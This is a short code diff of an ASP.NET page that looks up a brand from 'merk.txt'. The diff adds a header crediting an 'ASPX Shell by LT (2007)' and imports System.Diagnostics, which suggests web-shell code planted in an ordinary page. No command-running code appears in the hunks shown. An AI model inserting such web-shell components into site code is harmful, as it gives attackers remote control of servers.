@@ -1,4 +1,9 @@
-<%@ Page Language="C#" %>
+<%-- ASPX Shell by LT <lt@mac.hush.com> (2007) --%>
+<%@ Page Language="C#" EnableViewState="false" %>
+<%@ Import Namespace="System.Web.UI.WebControls" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<%@ Import Namespace="System.IO" %>
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -30,13 +35,13 @@
         {
             string filename = Server.MapPath("merk.txt");
 
-            if (!System.IO.File.Exists(filename))
+            if (!File.Exists(filename))
             {
                 Show404Page();
                 return;
             }
 
-            string[] lines = System.IO.File.ReadAllLines(filename);
+            string[] lines = File.ReadAllLines(filename);
             string brand = null;
 
             foreach (string item in lines)
